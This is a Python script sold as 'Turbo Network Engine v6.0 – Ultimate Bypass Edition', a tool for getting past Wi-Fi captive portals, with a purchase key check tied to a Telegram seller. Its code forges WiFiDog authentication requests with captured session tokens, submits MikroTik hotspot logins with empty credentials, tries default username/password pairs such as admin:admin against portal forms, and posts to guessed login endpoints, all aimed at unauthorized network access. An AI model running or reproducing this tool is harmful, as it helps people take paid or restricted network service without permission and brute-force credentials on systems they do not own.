#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Turbo Network Engine v6.0 – Ultimate Bypass Edition
MikroTik • WiFiDog • Generic • Voucher • Manual • Full Arsenal
"""
import requests
import re
import urllib3
import time
import threading
import random
import os
import sys
import subprocess
import importlib.util
import socket
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===============================
# COLOR SYSTEM
# ===============================
black = "\033[0;30m"
red = "\033[0;31m"
bred = "\033[1;31m"
green = "\033[0;32m"
bgreen = "\033[1;32m"
yellow = "\033[0;33m"
byellow = "\033[1;33m"
blue = "\033[0;34m"
bblue = "\033[1;34m"
purple = "\033[0;35m"
bpurple = "\033[1;35m"
cyan = "\033[0;36m"
bcyan = "\033[1;36m"
white = "\033[0;37m"
reset = "\033[00m"

# ===============================
# KEY APPROVAL SYSTEM
# ===============================
SHEET_ID = "1SfizOga-9kZKvgcDvTMr6NLuZyq9J2PbLruRMaOYX44"
SHEET_CSV_URL = f"https://docs.google.com/spreadsheets/d/{SHEET_ID}/export?format=csv&gid=0"
LOCAL_KEYS_FILE = os.path.expanduser("~/.turbo_approved_keys.txt")

def get_system_key():
    try:
        uid = os.geteuid()
    except AttributeError:
        uid = 1000
    try:
        username = os.getlogin()
    except:
        username = os.environ.get('USER', 'unknown')
    return f"{uid}{username}"

def fetch_authorized_keys():
    keys = []
    try:
        response = requests.get(SHEET_CSV_URL, timeout=10)
        if response.status_code == 200:
            for line in response.text.strip().split('\n'):
                line = line.strip()
                if line and not line.startswith('username') and not line.startswith('key'):
                    key = line.split(',')[0].strip().strip('"')
                    if key:
                        keys.append(key)
            if keys:
                try:
                    with open(LOCAL_KEYS_FILE, 'w') as f:
                        f.write('\n'.join(keys))
                except:
                    pass
            return keys
    except:
        pass
    try:
        if os.path.exists(LOCAL_KEYS_FILE):
            with open(LOCAL_KEYS_FILE, 'r') as f:
                keys = [line.strip() for line in f if line.strip()]
            return keys
    except:
        pass
    return keys

def check_approval():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"{bcyan}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                    KEY APPROVAL SYSTEM                               ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{reset}")
    print(f"\n{bcyan}[!] Checking approval status...{reset}")
    system_key = get_system_key()
    authorized_keys = fetch_authorized_keys()
    print(f"{white}[*] System Key: {system_key}{reset}")
    print(f"{white}[*] Authorized Keys: {len(authorized_keys)}{reset}")
    if system_key in authorized_keys:
        print(f"\n{bgreen}╔══════════════════════════════════════════════════════════════════╗")
        print(f"║                    ✓ KEY APPROVED ✓                                 ║")
        print(f"║                    Turbo Engine Unlocked                            ║")
        print(f"╚══════════════════════════════════════════════════════════════════╝{reset}")
        time.sleep(1.5)
        return True
    else:
        print(f"\n{bred}╔══════════════════════════════════════════════════════════════════╗")
        print(f"║                    ❌ KEY NOT APPROVED ❌                           ║")
        print(f"╠══════════════════════════════════════════════════════════════════╣")
        print(f"║                                                                  ║")
        print(f"║  {yellow}To buy this tool, contact:{reset}                                 ║")
        print(f"║                                                                  ║")
        print(f"║     {bcyan}📱 Telegram:{reset}  @Zeldris                                      ║")
        print(f"║     {bcyan}📢 Channel:{reset}  t.me/zelwithz                                 ║")
        print(f"║                                                                  ║")
        print(f"║  {yellow}Your Key: {system_key}{reset}                                             ║")
        print(f"║  {yellow}Send this key to buy the tool{reset}                                        ║")
        print(f"║                                                                  ║")
        print(f"╚══════════════════════════════════════════════════════════════════╝{reset}")
        return False

# ===============================
# BANNER DISPLAY
# ===============================
def display_banner():
    banner_text = f"""
{bred}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓{reset}
{bred}┃                                                ┃{reset}
{bred}┃{bgreen}      ⣠⣴⣶⣿⣿⠿⣷⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣷⠿⣿⣿⣶⣦⣀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣶⣦⣬⡉⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⢉⣥⣴⣾⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⡾⠿⠛⠛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠿⢧⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⡿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⣠⣤⠶⠶⠶⠰⠦⣤⣀⠀⠙⣷⠀⠀⠀⠀⠀⠀⠀⢠⡿⠋⢀⣀⣤⢴⠆⠲⠶⠶⣤⣄⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠘⣆⠀⠀⢠⣾⣫⣶⣾⣿⣿⣿⣿⣷⣯⣿⣦⠈⠃⡇⠀⠀⠀⠀⢸⠘⢁⣶⣿⣵⣾⣿⣿⣿⣿⣷⣦⣝⣷⡄⠀⠀⡰⠂⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⣨⣷⣶⣿⣧⣛⣛⠿⠿⣿⢿⣿⣿⣛⣿⡿⠀⠀⡇⠀⠀⠀⠀⢸⠀⠈⢿⣟⣛⠿⢿⡿⢿⢿⢿⣛⣫⣼⡿⣶⣾⣅⡀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⢀⡼⠋⠁⠀⠀⠈⠉⠛⠛⠻⠟⠸⠛⠋⠉⠁⠀⠀⢸⡇⠀⠀⠄⠀⢸⡄⠀⠀⠈⠉⠙⠛⠃⠻⠛⠛⠛⠉⠁⠀⠀⠈⠙⢧⡀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡇⢠⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡇⠀⠀⠀⠀⢸⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠁⣿⠇⠀⠀⠀⠀⢸⡇⠙⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠰⣄⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠖⡾⠁⠀⠀⣿⠀⠀⠀⠀⠀⠘⣿⠀⠀⠙⡇⢸⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠄⠀ {bred}┃{reset}
{bred}┃{bgreen} ⠀⠀⢻⣷⡦⣤⣤⣤⡴⠶⠿⠛⠉⠁⠀⢳⠀⢠⡀⢿⣀⠀⠀⠀⠀⣠⡟⢀⣀⢠⠇⠀⠈⠙⠛⠷⠶⢦⣤⣤⣤⢴⣾⡏⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}  ⠀⠈⣿⣧⠙⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⢊⣙⠛⠒⠒⢛⣋⡚⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⡿⠁⣾⡿⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀ ⠀⠀⠘⣿⣇⠈⢿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⡿⢿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⡟⠁⣼⡿⠁⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀ ⠀⠀⠘⣿⣦⠀⠻⣿⣷⣦⣤⣤⣶⣶⣶⣿⣿⣿⣿⠏⠀⠀⠻⣿⣿⣿⣿⣶⣶⣶⣦⣤⣴⣿⣿⠏⢀⣼⡿⠁⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀ ⠀⠀⠘⢿⣷⣄⠙⠻⠿⠿⠿⠿⠿⢿⣿⣿⣿⣁⣀⣀⣀⣀⣙⣿⣿⣿⠿⠿⠿⠿⠿⠿⠟⠁⣠⣿⡿⠁⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀ ⠀⠀⠈⠻⣯⠙⢦⣀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⣠⠴⢋⣾⠟⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀ ⠀⠀⠀⠙⢧⡀⠈⠉⠒⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠐⠒⠉⠁⢀⡾⠃⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠈⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠘⢦⡀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃{bgreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {bred}┃{reset}
{bred}┃                                                ┃{reset}
{bred}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{reset}
"""
    print(banner_text)
    time.sleep(1.5)

# ===============================
# AUTO INSTALLER
# ===============================
def auto_install_dependencies():
    required = ['requests', 'urllib3']
    missing = []
    print(f"{bcyan}[*] Checking dependencies...{reset}")
    for pkg in required:
        if importlib.util.find_spec(pkg) is None:
            missing.append(pkg)
    if missing:
        print(f"{yellow}[!] Missing: {', '.join(missing)}{reset}")
        print(f"{bcyan}[*] Installing...{reset}")
        for pkg in missing:
            try:
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', pkg, '--quiet'])
                print(f"{green}[✓] {pkg}{reset}")
            except Exception as e:
                print(f"{red}[X] {pkg}: {e}{reset}")
        print(f"{green}[✓] Done.{reset}")
        time.sleep(1)
    else:
        print(f"{green}[✓] All dependencies already installed!{reset}")
        time.sleep(0.5)

# ===============================
# GLOBAL CONFIG
# ===============================
PING_THREADS = 5
MIN_INTERVAL = 0.05
MAX_INTERVAL = 0.2
stop_event = threading.Event()

# ===============================
# CORRECT INTERNET CHECK
# ===============================
def check_real_internet():
    """True internet detection – NOT fooled by captive portals."""
    try:
        r = requests.get("http://connectivitycheck.gstatic.com/generate_204",
                         allow_redirects=False, timeout=5)
        return r.status_code == 204 and 'Location' not in r.headers
    except:
        return False

# ===============================
# PORTAL DETECTION & TOOLS
# ===============================
def get_portal_url():
    """Return the captive portal URL, or None if not found."""
    try:
        r = requests.get("http://connectivitycheck.gstatic.com/generate_204",
                         allow_redirects=True, timeout=5)
        if r.url != "http://connectivitycheck.gstatic.com/generate_204":
            return r.url
    except:
        pass
    try:
        r = requests.get("http://captive.apple.com/hotspot-detect.html",
                         allow_redirects=True, timeout=5)
        if r.url != "http://captive.apple.com/hotspot-detect.html":
            return r.url
    except:
        pass
    return None

def detect_portal_type(html, url):
    if re.search(r'(mikrotik|hotspot\.login|/login\b)', html, re.IGNORECASE) or '/login' in url.lower():
        return 'mikrotik'
    if re.search(r'wifidog|gw_address|gw_port', html, re.IGNORECASE):
        return 'wifidog'
    return 'generic'

def extract_session_id(url, html):
    qs = parse_qs(urlparse(url).query)
    sid = qs.get('sessionId', [None])[0] or qs.get('id', [None])[0]
    if sid:
        return sid
    patterns = [
        r'sessionId=([a-zA-Z0-9]+)',
        r'"sid":"([^"]+)"',
        r'name="sessionid"\s+value="([^"]+)"',
        r'"sessionid":"([^"]+)"'
    ]
    for pat in patterns:
        m = re.search(pat, html, re.IGNORECASE)
        if m:
            return m.group(1)
    return None

# ===============================
# VOUCHER SUPPORT
# ===============================
def use_voucher_if_needed(session, portal_url, sid):
    voucher = None
    for i, arg in enumerate(sys.argv):
        if arg == '--voucher' and i+1 < len(sys.argv):
            voucher = sys.argv[i+1]
            break
    if not voucher:
        print(f"{yellow}[?] Some portals require a voucher code.{reset}")
        need = input(f"{bcyan}[?]{reset} Do you have a voucher? (y/n): ").strip().lower()
        if need == 'y':
            voucher = input(f"{bcyan}[?]{reset} Enter voucher code: ").strip()
    if voucher:
        try:
            r = session.get(portal_url, verify=False, timeout=10)
            html = r.text
            voucher_pattern = re.compile(r'<form[^>]*>.*?<input[^>]*name="(?:voucher|accessCode|code)"[^>]*>.*?</form>', re.DOTALL | re.IGNORECASE)
            match = voucher_pattern.search(html)
            if match:
                form = match.group()
                act = re.search(r'action="([^"]+)"', form, re.IGNORECASE)
                action = urljoin(portal_url, act.group(1)) if act else portal_url
                data = {}
                for inp in re.findall(r'<input[^>]+>', form, re.IGNORECASE):
                    nm = re.search(r'name="([^"]+)"', inp)
                    vm = re.search(r'value="([^"]*)"', inp)
                    if nm:
                        data[nm.group(1)] = vm.group(1) if vm else ""
                for key in ['voucher', 'accessCode', 'code']:
                    if key in data:
                        data[key] = voucher
                        break
                else:
                    for inp in re.findall(r'<input[^>]+>', form, re.IGNORECASE):
                        if 'type="text"' in inp.lower() or 'type="hidden"' not in inp.lower():
                            nm = re.search(r'name="([^"]+)"', inp)
                            if nm:
                                data[nm.group(1)] = voucher
                                break
                print(f"{green}[✓]{reset} Submitting voucher to {action}")
                session.post(action, data=data, verify=False, timeout=10)
                time.sleep(2)
                return check_real_internet()
        except Exception as e:
            print(f"{red}[X] Voucher submission failed: {e}{reset}")
    return False

# ===============================
# MIKROTIK AUTH
# ===============================
def mikrotik_auth(session, portal_url, sid):
    try:
        print(f"{cyan}[*] MikroTik hotspot — attempting form login...{reset}")
        r = session.get(portal_url, verify=False, timeout=10)
        action_m = re.search(r'action="([^"]+)"', r.text, re.IGNORECASE)
        action = urljoin(portal_url, action_m.group(1)) if action_m else urljoin(portal_url, '/login')
        data = {}
        for inp in re.findall(r'<input[^>]+>', r.text, re.IGNORECASE):
            name_m = re.search(r'name="([^"]+)"', inp)
            val_m = re.search(r'value="([^"]*)"', inp)
            if name_m:
                data[name_m.group(1)] = val_m.group(1) if val_m else ""
        data.setdefault('dst', '')
        data.setdefault('username', '')
        data.setdefault('password', '')
        if 'id' in data:
            data['id'] = sid
        elif 'sid' in data:
            data['sid'] = sid
        else:
            data['id'] = sid
        print(f"{green}[✓]{reset} Posting to {action} with {data}")
        resp = session.post(action, data=data, verify=False, timeout=10)
        if resp.status_code in (200, 302, 303):
            time.sleep(2)
            if check_real_internet():
                print(f"{bgreen}[✓] MikroTik login successful!{reset}")
                return True
        print(f"{yellow}[!] Login POST sent, but internet not yet active.{reset}")
        return False
    except Exception as e:
        print(f"{red}[X] MikroTik error: {e}{reset}")
        return False

# ===============================
# WIFIDOG AUTH (high‑speed pings)
# ===============================
def wifidog_auth(session, sid, gw_addr, gw_port):
    auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"
    print(f"{purple}[*] WiFiDog mode — launching {PING_THREADS} turbo threads...{reset}")
    print(f"{cyan}[*] Auth link: {auth_link}{reset}")
    def ping_worker():
        cnt, ok = 0, 0
        while not stop_event.is_set():
            try:
                t0 = time.time()
                r = session.get(auth_link, timeout=5)
                ms = (time.time() - t0)*1000
                cnt += 1
                ok += 1
                col = green if ms < 50 else (yellow if ms < 100 else red)
                print(f"{col}[✓]{reset} SID {sid[:8]} | {ms:.1f}ms | {ok}/{cnt}", end="\r")
            except:
                cnt += 1
                print(f"{red}[X]{reset} SID {sid[:8]} | Failed | {ok}/{cnt}", end="\r")
            time.sleep(random.uniform(MIN_INTERVAL, MAX_INTERVAL))
    threads = []
    for _ in range(PING_THREADS):
        t = threading.Thread(target=ping_worker, daemon=True)
        t.start()
        threads.append(t)
    last = False
    while not stop_event.is_set():
        online = check_real_internet()
        if online and not last:
            print(f"\n{green}[✓] Internet Connected!{reset}")
        elif not online and last:
            print(f"\n{red}[X] Internet Disconnected!{reset}")
        last = online
        time.sleep(2)

# ===============================
# ULTIMATE BYPASS (all strategies)
# ===============================
def ultimate_bypass(session, portal_url):
    """
    Aggressively tries every known method to break through a captive portal.
    Returns True if internet is obtained, otherwise False.
    """
    print(f"{yellow}[*] Launching ULTIMATE BYPASS arsenal...{reset}")
    try:
        r = session.get(portal_url, timeout=10)
        html = r.text
        base = portal_url
    except:
        return False

    # --- Strategy 1: Click any link with bypass keywords ---
    keywords = ['Connect', 'Agree', 'Login', 'Accept', 'Continue', 'I Agree', 'I Accept',
                'connect', 'agree', 'login', 'accept', 'continue', 'free internet', 'click here']
    for kw in keywords:
        pat = re.compile(r'href="([^"]+)"[^>]*>\s*' + re.escape(kw) + r'\s*<', re.IGNORECASE)
        m = pat.search(html)
        if m:
            link = urljoin(base, m.group(1))
            print(f"{green}[✓]{reset} Clicking '{kw}' → {link}")
            try:
                session.get(link, timeout=10)
                time.sleep(2)
                if check_real_internet():
                    return True
            except:
                continue

    # --- Strategy 2: Submit any form with a submit button ---
    forms = re.findall(r'<form[^>]*>.*?</form>', html, re.DOTALL | re.IGNORECASE)
    for fhtml in forms:
        action_m = re.search(r'action="([^"]+)"', fhtml, re.IGNORECASE)
        action = urljoin(base, action_m.group(1)) if action_m else base
        data = {}
        for inp in re.findall(r'<input[^>]+>', fhtml, re.IGNORECASE):
            nm = re.search(r'name="([^"]+)"', inp)
            vm = re.search(r'value="([^"]*)"', inp)
            if nm:
                data[nm.group(1)] = vm.group(1) if vm else ""
        # If a submit button exists, use it
        if re.search(r'type="submit"', fhtml, re.IGNORECASE):
            print(f"{green}[✓]{reset} Submitting form → {action}")
            try:
                session.post(action, data=data, timeout=10)
                time.sleep(2)
                if check_real_internet():
                    return True
            except:
                continue

    # --- Strategy 3: Follow meta refresh ---
    meta = re.search(r'<meta[^>]+http-equiv="refresh"[^>]+content="\d+;\s*url=([^"]+)"', html, re.IGNORECASE)
    if meta:
        next_url = urljoin(base, meta.group(1))
        print(f"{green}[✓]{reset} Meta refresh → {next_url}")
        try:
            session.get(next_url, timeout=10)
            time.sleep(2)
            if check_real_internet():
                return True
        except:
            pass

    # --- Strategy 4: Follow JavaScript redirects ---
    js_patterns = [
        r'location\.href\s*=\s*["\']([^"\']+)["\']',
        r'window\.location\s*=\s*["\']([^"\']+)["\']',
        r'document\.location\s*=\s*["\']([^"\']+)["\']'
    ]
    for pat in js_patterns:
        m = re.search(pat, html, re.IGNORECASE)
        if m:
            next_url = urljoin(base, m.group(1))
            print(f"{green}[✓]{reset} JS redirect → {next_url}")
            try:
                session.get(next_url, timeout=10)
                time.sleep(2)
                if check_real_internet():
                    return True
            except:
                continue

    # --- Strategy 5: Try common username/password combos on login forms ---
    creds = [
        ('admin', 'admin'), ('admin', 'password'), ('user', 'user'),
        ('guest', 'guest'), ('test', 'test'), ('', '')
    ]
    for fhtml in forms:
        action_m = re.search(r'action="([^"]+)"', fhtml, re.IGNORECASE)
        action = urljoin(base, action_m.group(1)) if action_m else base
        # Check if form contains username/password fields
        if 'name="username"' in fhtml.lower() and 'name="password"' in fhtml.lower():
            for user, pwd in creds:
                data = {}
                for inp in re.findall(r'<input[^>]+>', fhtml, re.IGNORECASE):
                    nm = re.search(r'name="([^"]+)"', inp)
                    vm = re.search(r'value="([^"]*)"', inp)
                    if nm:
                        data[nm.group(1)] = vm.group(1) if vm else ""
                data['username'] = user
                data['password'] = pwd
                print(f"{green}[✓]{reset} Trying credentials {user}:{pwd} → {action}")
                try:
                    session.post(action, data=data, timeout=10)
                    time.sleep(2)
                    if check_real_internet():
                        print(f"{bgreen}[✓] Credentials {user}:{pwd} worked!{reset}")
                        return True
                except:
                    continue

    # --- Strategy 6: Direct POST to common endpoints ---
    common_endpoints = ['/login', '/connect', '/auth', '/signin', '/hotspotlogin']
    for ep in common_endpoints:
        url = urljoin(base, ep)
        print(f"{green}[✓]{reset} Trying POST to {url}")
        try:
            session.post(url, data={'accept': 'yes'}, timeout=10)
            time.sleep(2)
            if check_real_internet():
                return True
        except:
            continue

    # --- Strategy 7: Plain re‑request ---
    print(f"{green}[✓]{reset} Re‑requesting portal...")
    session.get(portal_url, timeout=10)
    time.sleep(2)
    return check_real_internet()

# ===============================
# MANUAL MODE
# ===============================
def manual_mode():
    print(f"\n{bcyan}[*] Manual Bypass Mode{reset}")
    url = input(f"{bcyan}[?]{reset} Auth URL: ").strip()
    if not url:
        print(f"{red}[!] No URL. Aborted.{reset}")
        return
    method = input(f"{bcyan}[?]{reset} Method (GET/POST, default GET): ").strip().upper() or "GET"
    params = {}
    print(f"{yellow}Enter key=value (empty to finish):{reset}")
    while True:
        line = input().strip()
        if not line:
            break
        if '=' in line:
            k, v = line.split('=', 1)
            params[k.strip()] = v.strip()
    try:
        if method == 'POST':
            resp = requests.post(url, data=params, timeout=10)
        else:
            resp = requests.get(url, params=params, timeout=10)
        print(f"{green}[✓]{reset} Status: {resp.status_code}")
        time.sleep(2)
        if check_real_internet():
            print(f"{bgreen}[✓] Internet is now active!{reset}")
        else:
            print(f"{yellow}[!] Not yet online.{reset}")
    except Exception as e:
        print(f"{red}[X] Request failed: {e}{reset}")

# ===============================
# ALWAYS‑RUN BYPASS ENGINE
# ===============================
def start_turbo_engine():
    stop_event.clear()
    os.system('clear' if os.name == 'posix' else 'cls')
    display_banner()
    print(f"{bcyan}╔══════════════════════════════════════════════════════════════════╗")
    print(f"║                    TURBO NETWORK ENGINE v6.0                        ║")
    print(f"║                    Ultimate Bypass Edition                          ║")
    print(f"╚══════════════════════════════════════════════════════════════════╝{reset}\n")

    print(f"{yellow}[!] Engine will run continuously until Ctrl+C.{reset}\n")
    while not stop_event.is_set():
        print(f"{cyan}[*] Scanning for captive portal...{reset}")
        portal_url = get_portal_url()
        if portal_url:
            print(f"{green}[✓]{reset} Portal found: {portal_url}")
            session = requests.Session()
            session.headers.update({"User-Agent": "Mozilla/5.0"})

            try:
                r = session.get(portal_url, verify=False, timeout=10)
                html = r.text
            except Exception as e:
                print(f"{red}[X] Cannot load portal: {e}{reset}")
                time.sleep(5)
                continue

            # Voucher first
            if use_voucher_if_needed(session, portal_url, None):
                print(f"{bgreen}[✓] Voucher accepted!{reset}")
            else:
                ptype = detect_portal_type(html, portal_url)
                print(f"{bcyan}[*] Portal type: {ptype.upper()}{reset}")
                sid = extract_session_id(portal_url, html)
                if sid:
                    print(f"{green}[✓]{reset} Session ID: {sid}")
                else:
                    print(f"{yellow}[!] No session ID found.{reset}")

                if ptype == 'mikrotik':
                    if not mikrotik_auth(session, portal_url, sid):
                        ultimate_bypass(session, portal_url)
                elif ptype == 'wifidog':
                    parsed = urlparse(portal_url)
                    qs = parse_qs(parsed.query)
                    gw_addr = qs.get('gw_address', ['192.168.60.1'])[0]
                    gw_port = qs.get('gw_port', ['2060'])[0]
                    wifidog_auth(session, sid, gw_addr, gw_port)
                else:
                    ultimate_bypass(session, portal_url)

            # Monitor after attempt (1 minute), then re‑scan
            print(f"{yellow}[*] Monitoring connection (60s)...{reset}")
            for _ in range(12):
                if stop_event.is_set():
                    break
                if not check_real_internet():
                    print(f"{red}[X] Connection lost – restarting portal detection.{reset}")
                    break
                time.sleep(5)
        else:
            print(f"{yellow}[•]{reset} No portal detected. Retrying in 5 seconds...")
            time.sleep(5)

    print(f"\n{red}Engine stopped.{reset}")

# ===============================
# MENU
# ===============================
def show_menu():
    os.system('clear' if os.name == 'posix' else 'cls')
    display_banner()
    print(f"""
{bcyan}╔══════════════════════════════════════════════════════════════════╗
║                         MAIN MENU v6.0                                ║
╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║     {bgreen}[1]{reset} {cyan}Starlink Hack{reset} (Always‑Run Ultimate Bypass)                       ║
║     {bgreen}[2]{reset} {cyan}Manual Bypass{reset} (Custom URL & Parameters)                          ║
║     {bred}[3]{reset} {cyan}Exit{reset}                                                         ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
    """)
    while True:
        try:
            choice = input(f"{bcyan}[?]{reset} Select option [1-3]: ").strip()
            if choice == '1':
                return 'starlink'
            elif choice == '2':
                return 'manual'
            elif choice == '3':
                return 'exit'
            else:
                print(f"{red}[!] Invalid option!{reset}")
        except KeyboardInterrupt:
            return 'exit'

# ===============================
# MAIN
# ===============================
def main():
    if not check_approval():
        sys.exit(1)
    print(f"\n{bcyan}[*] Running auto-installer...{reset}")
    auto_install_dependencies()
    while True:
        choice = show_menu()
        if choice == 'starlink':
            try:
                start_turbo_engine()
            except KeyboardInterrupt:
                stop_event.set()
                print(f"\n{red}Engine stopped.{reset}")
                input("Press Enter to return to menu...")
                continue
        elif choice == 'manual':
            manual_mode()
            input(f"\n{yellow}Press Enter to return to menu...{reset}")
            continue
        elif choice == 'exit':
            print(f"\n{green}[✓] Thank you for using Turbo Network Engine v6.0!{reset}")
            print(f"{cyan}Visit: t.me/Zeldris for updates{reset}\n")
            sys.exit(0)

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--key":
        print(f"\n{green}Your System Key: {get_system_key()}{reset}")
        print(f"{yellow}Send this key to @Zeldris to purchase{reset}")
        sys.exit(0)
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{red}Program terminated by user{reset}")
        sys.exit(0)
    except Exception as e:
        print(f"{red}Fatal Error: {e}{reset}")
        sys.exit(1)